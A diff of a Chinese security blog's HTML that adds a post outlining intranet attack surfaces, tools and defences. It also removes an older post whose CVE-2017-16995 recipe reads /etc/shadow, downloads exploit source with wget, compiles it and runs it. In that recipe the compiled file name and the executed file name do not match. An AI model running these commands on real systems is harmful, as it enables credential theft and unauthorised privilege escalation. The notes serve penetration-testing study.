@@ -483,6 +483,300 @@
 <!-- Table of Contents -->
 
   
+    <article id="post-常规内网攻击面与防御方法"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2018/12/20/常规内网攻击面与防御方法/">常规内网攻击面与防御方法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/12/20/常规内网攻击面与防御方法/" class="article-date">
+	  <time datetime="2018-12-19T17:03:56.000Z" itemprop="datePublished">2018-12-20</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="常规内网攻击面与防御方法"><a href="#常规内网攻击面与防御方法" class="headerlink" title="常规内网攻击面与防御方法"></a>常规内网攻击面与防御方法</h1><blockquote>
+<p>本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。</p>
+</blockquote>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><blockquote>
+<p>记录内网环境下，一般常见的风险点/攻击面，以及对应的防御思路。</p>
+</blockquote>
+<h4 id="网络攻击杀伤链（Cyber-Kill-Chain）"><a href="#网络攻击杀伤链（Cyber-Kill-Chain）" class="headerlink" title="网络攻击杀伤链（Cyber-Kill-Chain）"></a>网络攻击杀伤链（Cyber-Kill-Chain）</h4><p>网络攻击杀伤链（<a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html" target="_blank" rel="noopener">Cyber-Kill-Chain</a>）是由洛克希德-马丁公司提出的，俗称洛马七步杀：</p>
+<p>1、RECONNAISSANCE 识别目标，信息收集；</p>
+<p>2、WEAPONIZATION 武器化准备工作；</p>
+<p>3、传递：传递载荷，启动运行；</p>
+<p>4、利用 获取目标访问权限；</p>
+<p>5、安装： 在目标建立堡垒；</p>
+<p>6、命令和控制（C2）： 远程控制和植入；</p>
+<p>7、目标达成；</p>
+<p>参看<a href="https://ti.360.net/blog/articles/apt-2018-report/" target="_blank" rel="noopener">全球高级持续性威胁（APT）2018年总结报告</a></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/newblog/20190223/QR8JJKBGYo9F.jpg?imageslim" alt="mark"></p>
+<p>​                                    </p>
+<h4 id="内网渗透一般流程"><a href="#内网渗透一般流程" class="headerlink" title="内网渗透一般流程"></a>内网渗透一般流程</h4><p>​    对于内网渗透一般流程是通过鱼叉钓鱼邮件的方式、内网开放服务漏洞直接进入内网、或者利用外网漏洞控制DMZ区的机器从而迂回进入内网、当然0day/Nday漏洞也是重点关注的。获取一定的个人PC/服务器/IOT权限，再进行提权，此后再进行本地/外部信息收集，从而进行内网范围的横向扩展，此过程是循环往复的行为以达到攻击目标的最大化，已达成需要获取的信息为目标。之后进行权限维持，根据情况长期控制目标权限。下文也会根据这几条进入内网</p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/newblog/20190223/6r7Iqw55rG7y.png?imageslim" alt="mark"></p>
+<h3 id="0x01-进入内网"><a href="#0x01-进入内网" class="headerlink" title="0x01 进入内网"></a>0x01 进入内网</h3><h4 id="1-1-社工方向"><a href="#1-1-社工方向" class="headerlink" title="1.1    社工方向"></a>1.1    社工方向</h4><h5 id="U盘社工攻击"><a href="#U盘社工攻击" class="headerlink" title="U盘社工攻击"></a>U盘社工攻击</h5><p>Badusb 低成本Arduino ， 树莓派zero ，Attiny85微型 USB接口开发板 Digispark kickstarter扩展板开发板</p>
+<p>橡皮鸭 模拟键盘。</p>
+<p>（1）Teensy是HID键盘攻击，出现cmd窗口。</p>
+<p>（2）badusb是可以伪装usb网卡劫持流量的。</p>
+<p><a href="https://github.com/CedArctic/DigiSpark-Scripts" target="_blank" rel="noopener">https://github.com/CedArctic/DigiSpark-Scripts</a></p>
+<h5 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h5><p>定向攻击、网站克隆。</p>
+<h5 id="鱼叉钓鱼攻击"><a href="#鱼叉钓鱼攻击" class="headerlink" title="鱼叉钓鱼攻击"></a>鱼叉钓鱼攻击</h5><p> <strong>IDNs</strong>钓鱼网站：国际化域名（IDNs）基于Unicode，不同语言进行注册。 而其中一些非拉丁字符语种的字母与拉丁字符非常相似,字面看很难区分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	国际化域名（IDN）是指全部或部分使⽤用特殊的⽂文字或字母组成的互联网域名，如使用阿拉伯</span><br><span class="line">语、中文、斯拉夫语、泰米尔语等。这些⽂文字系统多字节万国码编译而成。国际化域名使用域名</span><br><span class="line">代码（Punycode）编写并以美国信息交换标准代码（ASCII）字符串串储存在域名系统中。</span><br></pre></td></tr></table></figure>
+<p>事件：火币钓鱼，苹果官网钓鱼。</p>
+<p><strong>撒网</strong></p>
+<p>百度云分享软件，恶意软件。</p>
+<p><strong>鱼叉钓鱼：</strong></p>
+<h5 id="（1）office钓鱼"><a href="#（1）office钓鱼" class="headerlink" title="（1）office钓鱼"></a>（1）office钓鱼</h5><blockquote>
+<p>发信方式：求职信恶意文档，社交文件。</p>
+</blockquote>
+<ul>
+<li>office ：0day   CVE-2018-4878，CVE-2017-11882；</li>
+<li>Word DDE 即响应动态数据交换 钓鱼；</li>
+<li>Excel ：IQY钓鱼；<br>excel 中的一种特殊的’web 浏览器’,通过 IQY[即 web查询]语句,可以直接将各类web 上的列表数据轻松引入到当前的 excel 中；</li>
+<li>office宏后门钓鱼 empire 监听器并生成对应的<strong>宏</strong> <strong>payload</strong>  vba 代码；</li>
+<li>PDF 规范允许为 GoTobe 和 GoToR 条目来加载远程数据,正是利用这一特性能够帮我们请求远程恶意 smb 服务器,以此达到截获目标系统用户密码 hash 的目的；</li>
+<li>PPT 动作按钮 ，.ppsx 文件；</li>
+<li>.lnk快捷方式钓鱼；</li>
+</ul>
+<h5 id="（2）恶意开源代码"><a href="#（2）恶意开源代码" class="headerlink" title="（2）恶意开源代码"></a>（2）恶意开源代码</h5><p>开源代码钓鱼python，docker hub，node.js，GitHub代码，win c#等等。</p>
+<h4 id="1-2-营销社工"><a href="#1-2-营销社工" class="headerlink" title="1.2    营销社工"></a>1.2    营销社工</h4><ul>
+<li>钓鱼拿域用户账号密码，登录表单</li>
+<li>商家活动、贴海报、登录表单、需要账号输入密码验证员工身份，领取活动优惠。再进行内网钓鱼攻击。控制域内机器，</li>
+<li>扫码有礼。</li>
+</ul>
+<p>作用：</p>
+<p>1.提高员工安全意识</p>
+<p>2.提升信息安全部权威性与存在感</p>
+<h4 id="1-3-外网信息收集（OSINT）"><a href="#1-3-外网信息收集（OSINT）" class="headerlink" title="1.3    外网信息收集（OSINT）"></a>1.3    外网信息收集（OSINT）</h4><p>撞库、社交、GitHub、码云等等。拿到VPN账号，邮箱权限，进入内网。</p>
+<h4 id="1-4-内网开放服务"><a href="#1-4-内网开放服务" class="headerlink" title="1.4 内网开放服务"></a>1.4 内网开放服务</h4><p>边界设备、开放服务。</p>
+<h4 id="1-5-通过外网应用迂回进入内网"><a href="#1-5-通过外网应用迂回进入内网" class="headerlink" title="1.5 通过外网应用迂回进入内网"></a>1.5 通过外网应用迂回进入内网</h4><h4 id="1-6-内网穿透"><a href="#1-6-内网穿透" class="headerlink" title="1.6    内网穿透"></a>1.6    内网穿透</h4><h5 id="1-6-1-常见内网穿透工具与方式"><a href="#1-6-1-常见内网穿透工具与方式" class="headerlink" title="1.6.1 常见内网穿透工具与方式"></a>1.6.1 常见内网穿透工具与方式</h5><ul>
+<li>HTTP隧道<ul>
+<li>abptts    基于ssl加密的http隧道工具</li>
+<li>LCX 老</li>
+<li>rtcp.py</li>
+<li>htran</li>
+<li>Tunna 老</li>
+<li>reDuh</li>
+<li>reGeorg</li>
+</ul>
+</li>
+<li>SSH隧道</li>
+<li>DNS隧道<ul>
+<li>Iodine</li>
+<li>Dnscat2</li>
+</ul>
+</li>
+<li>ICMP隧道<ul>
+<li>icmpsh</li>
+</ul>
+</li>
+<li>TCP隧道<ul>
+<li>shootback</li>
+</ul>
+</li>
+<li>Socks代理<ul>
+<li>Earthworm</li>
+</ul>
+</li>
+<li>Shell反弹<ul>
+<li>meterpreter</li>
+<li>ssh bash nc py</li>
+<li>php jsp perl ruby lua</li>
+<li>vpn</li>
+</ul>
+</li>
+</ul>
+<h5 id="1-6-2-内网监控（流量监控）"><a href="#1-6-2-内网监控（流量监控）" class="headerlink" title="1.6.2 内网监控（流量监控）!!!"></a>1.6.2 内网监控（流量监控）!!!</h5><p>流量监控</p>
+<p> <a href="https://www.freebuf.com/articles/network/149328.html" target="_blank" rel="noopener">一次误报引发的DNS检测方案的思考：DNS隧道检测平民解决方案</a></p>
+<h3 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h3><h3 id="0x03-横向扩展"><a href="#0x03-横向扩展" class="headerlink" title="0x03 横向扩展"></a>0x03 横向扩展</h3><blockquote>
+<p>域kerberos 协议与域NTLM协议分别讨论。</p>
+</blockquote>
+<p><a href="https://www.freebuf.com/column/178936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/178936.html</a></p>
+<h4 id="3-1-弱点入侵"><a href="#3-1-弱点入侵" class="headerlink" title="3.1    弱点入侵"></a>3.1    弱点入侵</h4><p>根据上文所述根据内网服务进行弱点渗透。</p>
+<h4 id="基础服务"><a href="#基础服务" class="headerlink" title="基础服务"></a>基础服务</h4><h5 id="LDAP-389"><a href="#LDAP-389" class="headerlink" title="LDAP 389"></a>LDAP 389</h5><ul>
+<li>注入<ul>
+<li><a href="https://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html</a></li>
+</ul>
+</li>
+<li>未授权访问</li>
+<li>暴力破解<ul>
+<li><a href="https://github.com/m8r0wn/ldap_search" target="_blank" rel="noopener">https://github.com/m8r0wn/ldap_search</a></li>
+</ul>
+</li>
+</ul>
+<h5 id="Rsync-873"><a href="#Rsync-873" class="headerlink" title="Rsync 873"></a>Rsync 873</h5><ul>
+<li>未授权访问</li>
+<li>本地权限提升</li>
+</ul>
+<h5 id="RDP-3389"><a href="#RDP-3389" class="headerlink" title="RDP 3389"></a>RDP 3389</h5><ul>
+<li>中间人（MitM）<ul>
+<li><a href="http://www.4hou.com/penetration/11236.html" target="_blank" rel="noopener">http://www.4hou.com/penetration/11236.html</a></li>
+</ul>
+</li>
+<li>爆破RDP<ul>
+<li><a href="https://www.freebuf.com/articles/web/191375.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/191375.html</a></li>
+</ul>
+</li>
+<li><a href="https://www.freebuf.com/column/171508.html" target="_blank" rel="noopener">https://www.freebuf.com/column/171508.html</a></li>
+</ul>
+<h5 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h5><ul>
+<li>爆破:Autodiscover自动发现、OWA接口、EWS接口、ActiveSync接口爆破。<ul>
+<li><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></li>
+</ul>
+</li>
+<li>0day<ul>
+<li><a href="https://github.com/WyAtu/CVE-2018-8581" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-8581</a></li>
+</ul>
+</li>
+</ul>
+<h5 id="Lync"><a href="#Lync" class="headerlink" title="Lync"></a>Lync</h5><ul>
+<li>爆破</li>
+<li><a href="https://docs.microsoft.com/zh-cn/lyncserver/microsoft-lync-server-2013" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/lyncserver/microsoft-lync-server-2013</a></li>
+</ul>
+<h5 id="idrac爆破"><a href="#idrac爆破" class="headerlink" title="idrac爆破"></a>idrac爆破</h5><p>Dell PowerEdge R730xd</p>
+<h4 id="运维系统"><a href="#运维系统" class="headerlink" title="运维系统"></a>运维系统</h4><h5 id="Zabbix-8069"><a href="#Zabbix-8069" class="headerlink" title="Zabbix 8069"></a>Zabbix 8069</h5><ul>
+<li>远程命令执行</li>
+</ul>
+<h5 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h5><p>​    任意文件读取<br>​    任意用户token泄露<br>​    命令执行</p>
+<h5 id="Tomact"><a href="#Tomact" class="headerlink" title="Tomact"></a>Tomact</h5><ul>
+<li>管理控制台弱口令</li>
+<li>war包部署webshell</li>
+<li>CVE        <ul>
+<li>远程代码执行（CVE-2016-8735)</li>
+<li>Tomact put方法（CVE-2017-12615)</li>
+<li>Tomact 本地提权（CVE-2016-1240)Tomact </li>
+<li>安全绕过(CVE-2018-1305)鸡肋</li>
+</ul>
+</li>
+</ul>
+<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库:"></a>数据库:</h4><h5 id="MySQL-3306"><a href="#MySQL-3306" class="headerlink" title="MySQL 3306"></a>MySQL 3306</h5><ul>
+<li>爆破</li>
+<li>身份认证漏洞  CVE-2012-2122</li>
+</ul>
+<h5 id="MSSQL-1433"><a href="#MSSQL-1433" class="headerlink" title="MSSQL 1433"></a>MSSQL 1433</h5><ul>
+<li>暴破</li>
+<li>提权</li>
+</ul>
+<h5 id="Redis-6370"><a href="#Redis-6370" class="headerlink" title="Redis 6370"></a>Redis 6370</h5><ul>
+<li>暴破</li>
+<li>未授权访问</li>
+</ul>
+<h4 id="3-2-域内横向基本流程"><a href="#3-2-域内横向基本流程" class="headerlink" title="3.2  域内横向基本流程"></a>3.2  域内横向基本流程</h4><ul>
+<li>暴破<ul>
+<li>rpcclient查找接受空SMB会话</li>
+<li>ridenum在空SMB主机上通过RID循环查找有效的用户名</li>
+<li>收集用户名</li>
+<li>跑字典</li>
+</ul>
+</li>
+<li>网络共享<ul>
+<li>匿名可写网络共享</li>
+<li>使用指向计算机的文件图标路径将SCF文件写入共享</li>
+<li>当AD用户在文件资源管理器中打开共享时，会向发送NetNTLMv2哈希</li>
+</ul>
+</li>
+<li>内网协议LMNR/NBTNS/mDNS 欺骗<ul>
+<li>使用Responder.py 欺骗第2层广播/多播网络协议（LLMNR, NBT-NS, mDNS）并捕获NetNTLMv2 hash</li>
+</ul>
+</li>
+<li>SMB中继<ul>
+<li>使用ntlmrelayx.py和Responder.py来SMB中</li>
+</ul>
+</li>
+<li>远程命令执行<ul>
+<li>psexec  需要目标开启Admin$</li>
+<li>schtasks  管理计划任务</li>
+<li>sc  是用来与服务控制管理器和服务进行通信的命令行程序</li>
+<li>wmic    Windows管理工具  开放135端口</li>
+<li>wmiexec</li>
+<li>impackets 工具包 （wmiexec  python集成化）<ul>
+<li><a href="https://www.freebuf.com/sectool/175208.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/175208.html</a></li>
+<li><a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-3-基于域kerberos-协议"><a href="#3-3-基于域kerberos-协议" class="headerlink" title="3.3  基于域kerberos 协议"></a>3.3  基于域kerberos 协议</h4><h5 id="MS14-068（提升域管）：伪造PAC，条件Win2012-2012R2-域控"><a href="#MS14-068（提升域管）：伪造PAC，条件Win2012-2012R2-域控" class="headerlink" title="MS14-068（提升域管）：伪造PAC，条件Win2012/2012R2 域控"></a>MS14-068（提升域管）：伪造PAC，条件Win2012/2012R2 域控</h5><h5 id="Pass-The-Ticket-票据传递攻击）"><a href="#Pass-The-Ticket-票据传递攻击）" class="headerlink" title="Pass The Ticket(票据传递攻击）"></a>Pass The Ticket(票据传递攻击）</h5><h5 id="WIN2008-GPP漏洞（组策略）"><a href="#WIN2008-GPP漏洞（组策略）" class="headerlink" title="WIN2008 GPP漏洞（组策略）"></a>WIN2008 GPP漏洞（组策略）</h5><ul>
+<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">https://adsecurity.org/?p=2288</a></li>
+</ul>
+<h4 id="3-4-基于域TLM协议"><a href="#3-4-基于域TLM协议" class="headerlink" title="3.4 基于域TLM协议"></a>3.4 基于域TLM协议</h4><h5 id="基于NTLM（中继攻击）"><a href="#基于NTLM（中继攻击）" class="headerlink" title="基于NTLM（中继攻击）:"></a><strong>基于NTLM（中继攻击）</strong>:</h5><p><strong>SMB Relay Attack</strong></p>
+<p><strong>EWS Relay Attack</strong></p>
+<ul>
+<li><a href="https://www.freebuf.com/articles/system/176206.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/176206.html</a></li>
+</ul>
+<h5 id="Pass-The-Hash-通用密码攻击"><a href="#Pass-The-Hash-通用密码攻击" class="headerlink" title="Pass The Hash(通用密码攻击)!!!"></a><strong>Pass The Hash(通用密码攻击)</strong>!!!</h5><ul>
+<li>防御：微软提供的方案：<ul>
+<li><a href="https://www.microsoft.com/en-gb/download/details.aspx?id=36036" target="_blank" rel="noopener">https://www.microsoft.com/en-gb/download/details.aspx?id=36036</a></li>
+</ul>
+</li>
+</ul>
+<h5 id="Pass-The-Key-通用密码攻击"><a href="#Pass-The-Key-通用密码攻击" class="headerlink" title="Pass The Key (通用密码攻击)"></a><strong>Pass The Key (通用密码攻击)</strong></h5><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>windows 日志收集：</p>
+<p><a href="https://www.slideshare.net/Hackerhurricane/the-top-10-windows-logs-event-ids-used-v10?qid=e0003812-fbf1-4733-a5c7-379b39b4deba&amp;v=&amp;b=&amp;from_search=7" target="_blank" rel="noopener">https://www.slideshare.net/Hackerhurricane/the-top-10-windows-logs-event-ids-used-v10?qid=e0003812-fbf1-4733-a5c7-379b39b4deba&amp;v=&amp;b=&amp;from_search=7</a></p>
+<h3 id="0x04-达成目标"><a href="#0x04-达成目标" class="headerlink" title="0x04 达成目标"></a>0x04 达成目标</h3><p>传信、流量监测。</p>
+<h3 id="微软内网策略防御（ATA"><a href="#微软内网策略防御（ATA" class="headerlink" title="微软内网策略防御（ATA)"></a>微软内网策略防御（ATA)</h3><p> 微软ATA (高级威胁分析) 内网安全防护，基于机器学习，分析正常与异常流量。</p>
+<p>Advanced Threat Analytics</p>
+<p>参见：<a href="https://docs.microsoft.com/zh-cn/advanced-threat-analytics/what-is-ata" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/advanced-threat-analytics/what-is-ata</a></p>
+<p>微软  advanced threat Analt</p>
+<p>ATA 还利用专用<strong>网络分析引擎</strong>来捕获和分析多个协议（例如 Kerberos、DNS、RPC、NTLM 等等）的网络流量，以进行身份验证、授权和信息收集。 该信息由     ATA 通过以下方式收集：</p>
+<ul>
+<li>从域控制器和 DNS 服务器到 ATA 网关的端口镜像和/或</li>
+<li>直接在域控制器上部署 ATA 轻型网关 (LGW)</li>
+</ul>
+<p>ATA 搜索三种主要类型的攻击：<strong>恶意攻击、异常行为以及安全问题</strong>和风险。</p>
+<p><strong>恶意攻击</strong>是通过查找以下已知攻击类型的完整列表来确切检测到的，这些类型包括：</p>
+<ul>
+<li>传递票证 (PtT)</li>
+<li>传递哈希 (PtH)</li>
+<li>超传递哈希</li>
+<li>伪造 PAC (MS14-068)</li>
+<li>黄金票证</li>
+<li>恶意复制</li>
+<li>侦测</li>
+<li>暴力破解</li>
+<li>远程执行</li>
+</ul>
+<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul>
+<li><a href="https://attack.mitre.org/" target="_blank" rel="noopener">https://attack.mitre.org/</a></li>
+<li><a href="https://docs.microsoft.com/zh-cn/advanced-threat-analytics/what-is-ata" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/advanced-threat-analytics/what-is-ata</a></li>
+<li><a href="https://github.com/enaqx/awesome-pentest" target="_blank" rel="noopener">https://github.com/enaqx/awesome-pentest</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/34239250" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34239250</a></li>
+<li><a href="https://www.freebuf.com/column/160412.html" target="_blank" rel="noopener">https://www.freebuf.com/column/160412.html</a></li>
+<li><a href="https://ti.360.net/blog/articles/apt-2018-report/" target="_blank" rel="noopener">https://ti.360.net/blog/articles/apt-2018-report/</a></li>
+<li><a href="https://xz.aliyun.com/t/2354" target="_blank" rel="noopener">https://xz.aliyun.com/t/2354</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/34239250" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34239250</a></li>
+<li><a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" target="_blank" rel="noopener">https://jpcertcc.github.io/ToolAnalysisResultSheet/</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-域渗透实战简要总结"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -511,6 +805,7 @@
         <h1 id="域渗透实战简要总结"><a href="#域渗透实战简要总结" class="headerlink" title="域渗透实战简要总结"></a>域渗透实战简要总结</h1><blockquote>
 <p>本文记录域渗透的一些Tip与坑点，老外们的技术与分享精神好多干货，学无止境。</p>
 </blockquote>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/newblog/20190223/6r7Iqw55rG7y.png?imageslim" alt="mark"></p>
 <p>不断更新ing~</p>
 <h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><blockquote>
 <p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
@@ -688,11 +983,11 @@
 </ol>
 <p>此工具包仅限于我用于开发和调试的操作，因此不会加载其余部分。</p>
 <ol>
-<li><strong>EnumKit</strong></li>
+<li><strong>EnumKit  </strong>网络枚举</li>
 </ol>
 <p>此工具包中的操作围绕主机和网络枚举。凭证枚举操作应该使用CredKit。</p>
 <ol>
-<li><strong>PersistKit</strong>  </li>
+<li><strong>PersistKit</strong>  权限维持</li>
 </ol>
 <p>此工具包中的操作围绕端点持久性。示例包括后门服务创建，后门进程创建等</p>
 <ol>
@@ -1418,53 +1713,6 @@
       
       
       
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-CVE-2017-16995 Ubuntu16.04"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/">CVE-2017-16995 Ubuntu16.04漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2018/03/17/CVE-2017-16995 Ubuntu16.04/" class="article-date">
-	  <time datetime="2018-03-17T15:53:56.000Z" itemprop="datePublished">2018-03-17</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CVE-2017-16995-Ubuntu16-04"><a href="#CVE-2017-16995-Ubuntu16-04" class="headerlink" title="CVE-2017-16995 Ubuntu16.04"></a>CVE-2017-16995 Ubuntu16.04</h1><p><strong>影响版本：</strong><br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04</p>
-<p>提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用cat /proc/version查看Linux内核版本 ：</span><br><span class="line">cat /etc/shadow查看账号密码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">wget  http://cyseclabs.com/pub/upstream44.c</span><br><span class="line">gcc -o test upstream44.c </span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>emmmm  不懂</p>
-<h2 id="修复和缓解建议："><a href="#修复和缓解建议：" class="headerlink" title="修复和缓解建议："></a>修复和缓解建议：</h2><p>目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
-
     </footer>
   </div>
   
